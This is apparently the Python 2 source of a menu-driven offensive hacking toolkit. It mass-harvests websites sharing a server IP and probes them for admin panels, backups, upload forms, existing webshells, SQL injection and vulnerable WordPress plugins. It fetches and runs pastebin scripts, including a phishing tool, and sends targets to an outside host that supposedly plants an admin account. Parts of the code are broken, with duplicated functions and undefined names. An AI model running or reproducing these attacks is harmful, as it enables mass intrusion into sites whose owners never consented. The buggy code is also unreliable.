    jmtarget = raw_input("Select a targets list:")
    os.system("python temp.py %s" % jmtarget)


def inurl():
    dork = raw_input("select a Dork:")
    output = raw_input("select a file to save:")
    os.system(
        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    webHackingMenu.completed("InurlBR")


def insinurl():
    os.system(
        "git clone --depth=1 https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()


def jboss():
    clearScr()
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage: ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
    else:
        sayahac()


def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = raw_input("sites file: ")
    filepath = raw_input("Plugins File: ")

    def scan(site, dir):
        global resp
        try:
            conn = httplib.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except Exception as message:
            print("Cant Connect:" + message) 
            pass

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site, plugin)
            if resp not in Notfound:
                print("+----------------------------------------+")
                print("| current site:" + site)
                print("| Found Plugin: " + plugin)
                print("| Result:", resp)


class SQLMapTool:
    sqlmap_logo = """
  _____ ____  _      __  __           
 / ____/ __ \| |    |  \/  |          
| (___| |  | | |    | \  / | ___ _ __ 
 \___ \| |  | | |    | |\/| |/ _ \ '__|
 ____) | |__| | |____| |  | |  __/ |   
|_____/ \___\_\______|_|  |_|\___|_|   
"""
    def __init__(self):
        self.installDir = toolDir + "sqlmap"
        self.gitRepo = "https://github.com/sqlmapproject/sqlmap.git"
        
        self.targetPrompt = "   Enter the target URL for SQL injection: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/sqlmap.py")

    def install(self):
        # Clone the SQLmap repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))

    def run(self):
        clearScr()
        print(self.sqlmapLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.sqlmapLogo)
        print("   SQLMap Attack on Target: %s\n" % target)
        print("   {1}--Basic SQL Injection")
        print("   {2}--Enumerate Databases")
        print("   {3}--Dump Database Tables")
        print("   {4}--Get DBMS Banner")
        print("   {5}--Search for Specific Columns")
        print("   {99}-Return to previous menu \n")
        response = raw_input("sqlmap ~# ")
        clearScr()
        logPath = "logs/sqlmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("python2 %s/sqlmap.py -u %s --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python2 %s/sqlmap.py -u %s --dbs --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                db = raw_input("Enter the database name to dump tables from: ")
                os.system("python2 %s/sqlmap.py -u %s -D %s --tables --batch" % (self.installDir, target, db))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("python2 %s/sqlmap.py -u %s --banner --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                column = raw_input("Enter the column name to search for: ")
                os.system("python2 %s/sqlmap.py -u %s --search -C %s --batch" % (self.installDir, target, column))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




def grabuploadedlink(url):
    try:
        for dir in directories:
            currentcode = urllib.urlopen(url + dir).getcode()
            if currentcode == 200 or currentcode == 403:
                print "-------------------------"
                print "  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"
                print "-------------------------"
                upload.append(url + dir)
    except:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                currentcode = urllib.urlopen(upl + shell).getcode()
                if currentcode == 200:
                    print "-------------------------"
                    print "  [ ! ] Found Shell:  " + \
                        str(upl + shell) + " [ ! ]"
                    print "-------------------------"
    except:
        pass


def shelltarget():
    print("Exemple: http://target.com")
    line = raw_input("target: ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)


def poet():
    print("POET is a simple POst-Exploitation Tool.\n")
    if yesOrNo():
        os.system("git clone --depth=1 https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    else:
        postExploitationMenu.completed("POET")


def ssls():
    print('''sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module.''')
    if yesOrNo():
        os.system("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
        os.system("apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    else:
        sniffingSpoofingMenu.completed("SSlStrip")


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):

    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_gravityforms(sites):
    import urllib
    gravityforms = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
                gravityforms.append(site)
        except:
            pass

    return gravityforms


def gravity():
    ip = raw_input('Enter IP: ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print ss

    print('\n')
    print('[*] Found, ', len(gravityforms), ' gravityforms.')


class ExploitDBTool:
    exploit_logo = """
  ______           _ _     _   ____  ____  
 |  ____|         (_) |   | | |  _ \|  _ \ 
 | |__   _ __ ___  _| | __| | | |_) | |_) |
 |  __| | '_ ` _ \| | |/ _` | |  _ <|  __/ 
 | |____| | | | | | | | (_| | | |_) | |    
 |______|_| |_| |_|_|_|\__,_| |____/|_|    
"""
    def __init__(self):
        self.installDir = toolDir + "exploit-db"
        self.gitRepo = "https://github.com/offensive-security/exploitdb.git"
        
        self.targetPrompt = "   Enter the software name or keyword to search for exploits: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/bin/searchsploit")

    def install(self):
        # Clone the Exploit-DB repository and install searchsploit
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && ./searchsploit -u" % self.installDir)

    def run(self):
        clearScr()
        print(self.exploitLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.exploitLogo)
        print("   Exploit-DB Search for: %s\n" % target)
        print("   {1}--Search for Exploits")
        print("   {2}--Search by Software Version")
        print("   {3}--Search for Shellcodes")
        print("   {4}--View Exploit Details")
        print("   {5}--Download Exploit")
        print("   {99}-Return to previous menu \n")
        response = raw_input("searchsploit ~# ")
        clearScr()
        logPath = "logs/exploitdb-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("searchsploit %s" % target)
                response = raw_input(continuePrompt)
            elif response == "2":
                version = raw_input("Enter the software version (e.g., 1.2.3): ")
                os.system("searchsploit %s %s" % (target, version))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("searchsploit --shellcode %s" % target)
                response = raw_input(continuePrompt)
            elif response == "4":
                exploit_id = raw_input("Enter the Exploit ID or Path: ")
                os.system("searchsploit -x %s" % exploit_id)
                response = raw_input(continuePrompt)
            elif response == "5":
                exploit_id = raw_input("Enter the Exploit ID or Path to download: ")
                os.system("searchsploit -m %s" % exploit_id)
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




def androidhash():
    key = raw_input("Enter the android hash: ")
    salt = raw_input("Enter the android salt: ")
    os.system(
        "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
    os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))


def cmsfew():
    print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
    target = raw_input("Select a target: ")
    os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")


menuu = fsocietylogo + '''

   {1}--Get all websites
   {2}--Get joomla websites
   {3}--Get wordpress websites 
   {4}--Control Panel Finder
   {5}--Zip Files Finder
   {6}--Upload File Finder
   {7}--Get server users
   {8}--SQli Scanner
   {9}--Ports Scan (range of ports)
   {10}-ports Scan (common ports)
   {11}-Get server Info
   {12}-Bypass Cloudflare

   {99}-Back To Main Menu
'''


def unique(seq):
    '''
    get unique from list found it on stackoverflow
    '''
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


class Fscan:
    def __init__(self, serverip):
        self.serverip = serverip
        self.getSites(False)
        print menuu
        while True:
            choice = raw_input(sayahacPrompt)
            if choice == '1':
                self.getSites(True)
            elif choice == '2':
                self.getJoomla()
            elif choice == '3':
                self.getWordpress()
            elif choice == '4':
                self.findPanels()
            elif choice == '5':
                self.findZip()
            elif choice == '6':
                self.findUp()
            elif choice == '7':
                self.getUsers()
            elif choice == '8':
                self.grabSqli()
            elif choice == '9':
                ran = raw_input(' Enter range of ports, (ex: 1-1000) -> ')
                self.portScanner(1, ran)
            elif choice == '10':
                self.portScanner(2, None)
            elif choice == '11':
                self.getServerBanner()
            elif choice == '12':
                self.cloudflareBypasser()
            elif choice == '99':
                sayahac()
            con = raw_input(' Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                clearScr()
                print menuu

    def getSites(self, a):
        '''
        get all websites on same server
        from bing search
        '''
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    allnoclean = findwebs[i]
                    findall1 = re.findall('http://(.*?)/', allnoclean)
                    for idx, item in enumerate(findall1):
                        if 'www' not in item:
                            findall1[idx] = 'http://www.' + item + '/'
                        else:
                            findall1[idx] = 'http://' + item + '/'
                    lista.extend(findall1)

                page += 50
            except urllib2.URLError:
                pass
        self.sites = unique(lista)
        if a:
            clearScr()
            print('[*] Found ', len(lista), ' Website\n')
            for site in self.sites:
                print site

    def getWordpress(self):
        '''
        get wordpress site using a dork the attacker
        may do a password list attack (i did a tool for that purpose check my pastebin)
        or scan for common vulnerabilities using wpscan for example (i did a simple tool
        for multi scanning using wpscan)
        '''
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    wpnoclean = findwebs[i]
                    findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                    lista.extend(findwp)
                page += 50
            except:
                pass
        lista = unique(lista)
        clearScr()
        print('[*] Found ', len(lista), ' Wordpress Website\n')
        for site in lista:
            print site

    def getJoomla(self):
        '''
        get all joomla websites using
        bing search the attacker may bruteforce
        or scan them
        '''
        lista = []
        page = 1
        while page <= 101:
            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + \
                "+index.php?option=com&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                jmnoclean = findwebs[i]
                findjm = re.findall('(.*?)index.php', jmnoclean)
                lista.extend(findjm)
            page += 50
        lista = unique(lista)
        clearScr()
        print('[*] Found ' + len(lista) + ' Joomla Website\n')
        for site in lista:
            print site
############################
# find admin panels

    def findPanels(self):
        '''
        find panels from grabbed websites
        the attacker may do a lot of vulnerability
        tests on the admin area
        '''
        print "[~] Finding admin panels"
        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
                     'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
        clearScr()
        for site in self.sites:
            for admin in adminList:
                try:
                    if urllib.urlopen(site + admin).getcode() == 200:
                        print " [*] Found admin panel -> ", site + admin
                except IOError:
                    pass
 ############################
 # find ZIP files

    def findZip(self):
        '''
        find zip files from grabbed websites
        it may contain useful informations
        '''
        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
                   'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
        clearScr()
        print "[~] Finding zip file"
        for site in self.sites:
            for zip1 in zipList:
                try:
                    if urllib.urlopen(site + zip1).getcode() == 200:
                        print " [*] Found zip file -> ", site + zip1
                except IOError:
                    pass

    def findUp(self):
        '''
        find upload forms from grabbed
        websites the attacker may succeed to
        upload malicious files like webshells
        '''
        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
                  'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
        clearScr()
        print "[~] Finding Upload"
        for site in self.sites:
            for up in upList:
                try:
                    if (urllib.urlopen(site + up).getcode() == 200):
                        html = urllib.urlopen(site + up).readlines()
                        for line in html:
                            if re.findall('type=file', line):
                                print " [*] Found upload -> ", site + up
                except IOError:
                    pass

    def getUsers(self):
        '''
        get server users using a method found by
        iranian hackers , the attacker may
        do a bruteforce attack on CPanel, ssh, ftp or
        even mysql if it supports remote login
        (you can use medusa or hydra)
        '''
        clearScr()
        print "[~] Grabbing Users"
        userslist = []
        for site1 in self.sites:
            try:
                site = site1
                site = site.replace('http://www.', '')
                site = site.replace('http://', '')
                site = site.replace('.', '')
                if '-' in site:
                    site = site.replace('-', '')
                site = site.replace('/', '')
                while len(site) > 2:
                    resp = urllib2.urlopen(
                        site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                    if 'invalid username' not in resp.lower():
                        print '\t [*] Found -> ', site
                        userslist.append(site)
                        break
                    else:
                        print site

                    site = site[:-1]
            except:
                pass

        clearScr()
        for user in userslist:
            print user

    def cloudflareBypasser(self):
        '''
        tries to bypass cloudflare i already wrote
        in my blog how it works, i learned this
        method from a guy in madleets
        '''
        clearScr()
        print "[~] Bypassing cloudflare"
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
        for site in self.sites:
            site.replace('http://', '')
            site.replace('/', '')
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                pass
            for sub in subdoms:
                doo = sub + '.' + site
                print ' [~] Trying -> ', doo
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print ' [*] Cloudflare bypassed -> ', ddd
                        break
                except socket.error:
                    pass

    def getServerBanner(self):
        '''
        simply gets the server banner
        the attacker may benefit from it
        like getting the server side software
        '''
        clearScr()
        try:
            s = 'http://' + self.serverip
            httpresponse = urllib.urlopen(s)
            print ' [*] Server header -> ', httpresponse.headers.getheader(
                'server')
        except:
            print('[*] Server header ->  Not Found')

    def grabSqli(self):
        '''
        just grabs all websites in server with php?id= dork
        for scanning for error based sql injection
        '''
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)
            except:
                pass
            page += 50
        lista = unique(lista)
        self.checkSqli(lista)

    def checkSqli(self, s):
        '''
        checks for error based sql injection,
        most of the codes here are from webpwn3r
        project the one who has found an lfi in
        yahoo as i remember, you can find a separate
        tool in my blog
        '''
        clearScr()
        print "[~] Checking SQL injection"
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                    "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile(
            "Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        for url in s:
            try:
                for param in url.split('?')[1].split('&'):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())

                        html = urllib2.urlopen(power).readlines()
                        for line in html:
                            checker = re.findall(check, line)
                            if len(checker) != 0:
                                print ' [*] SQLi found -> ', power
            except:
                pass


    def portScanner(self, mode, ran):
        '''
        simple port scanner works with range of ports
        or with common ports (al-swisre idea)
        '''
        clearScr()
        print "[~] Scanning Ports"

        if mode == 1:
            a = ran.split('-')
            start = int(a[0])
            end = int(a[1])
            for i in range(start, end):
                do_it(self.serverip, i)
        elif mode == 2:
            for port in [80, 21, 22, 2082, 25, 53, 110, 443, 143]:
                do_it(self.serverip, port)


def do_it(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock = sock.connect_ex((ip, port))
    if sock == 0:
        print " [*] Port %i is open" % port


############################
minu = '''
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
'''


def drupal():
    '''Drupal Exploit Binger All Websites Of server '''
    ip = raw_input('1- IP: ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
                site = urlpa.netloc

                print "[+] Testing At " + site
                resp = urllib2.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User: HolaKo" in read:
                    print "Exploit found =>" + site

                    print "user:HolaKo\npass:admin"
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print "[-] Expl Not Found:( "

            except Exception as ex:
                print ex
                sys.exit(0)

        # Drupal Server ExtraCtor


def getdrupal():
    ip = raw_input('Enter The Ip:  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print site
                sites.append(site)

        # Drupal Mass List Exploiter


def drupallist():
    listop = raw_input("Enter The list Txt: ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib2.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print "[+]Success =>" + url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print i + "=> exploit not found "
        except Exception as ex:
            print ex


def maine():

    print minu
    choose = raw_input("choose a number: ")
    while True:

        if choose == "1":
            drupal()
        elif choose == "2":
            getdrupal()
        elif choose == "3":
            drupallist()
        elif choose == "4":
            about()
        elif choose == "99":
            sayahac()
        else:
            maine()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'administrator').getcode() == 200:
                joomla.append(site)
        except:
            pass

    return joomla


def wppjmla():

    ipp = raw_input('Enter Target IP: ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print ss
    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
    print '-' * 30 + '\n'
    for ss in joomla:
        print ss

    print '[+] Found ! ', len(joomla), ' Joomla Websites'

    print '\n'
# initialise the fscan function

############################


def grabsqli(ip):
    try:
        print color.OKBLUE + "Check_Uplaod... "
        print '\n'

        page = 1
        while page <= 21:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                ip + "+upload&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            sites = findwebs
            for i in sites:
                try:
                    response = urllib2.urlopen(i).read()
                    checksqli(i)
                except urllib2.HTTPError, e:
                    str(sites).strip(i)

            page = page + 10
    except:
        pass


def checksqli(sqli):
    responsetwo = urllib2.urlopen(sqli).read()
    find = re.findall('type="file"', responsetwo)
    if find:
        print(" Found ==> " + sqli)


def sqlscan():
    ip = raw_input('Enter IP -> ')
    grabsqli(ip)


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_wpstorethemeremotefileupload(sites):
    wpstorethemeremotefileupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                wpstorethemeremotefileupload.append(site)
        except:
            pass

    return wpstorethemeremotefileupload


def check_wpcontactcreativeform(sites):
    wpcontactcreativeform = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                wpcontactcreativeform.append(site)
        except:
            pass

    return wpcontactcreativeform


def check_wplazyseoplugin(sites):
    wplazyseoplugin = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                wplazyseoplugin.append(site)
        except:
            pass

    return wplazyseoplugin


def check_wpeasyupload(sites):
    wpeasyupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                wpeasyupload.append(site)
        except:
            pass

    return wpeasyupload


def check_wpsymposium(sites):
    wpsymposium = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                wpsycmium.append(site)
        except:
            pass

    return wpsymposium


def wpminiscanner():
    ip = raw_input('Enter IP: ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print ss
    print '[*] Found, ', len(wordpress), ' wordpress sites.'
    print '-' * 30 + '\n'
    for ss in wpstorethemeremotefileupload:
        print ss
    print '[*] Found, ', len(
        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpcontactcreativeform:
        print ss
    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
    print '-' * 30 + '\n'
    for ss in wplazyseoplugin:
        print ss
    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
    print '-' * 30 + '\n'
    for ss in wpeasyupload:
        print ss
    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpsymposium:
        print ss

    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'

    print '\n'
############################


if __name__ == "__main__":
    try:
        agreement()
        sayahac()
    except KeyboardInterrupt:
        print(" Finishing up...\n")
        time.sleep(0.25)
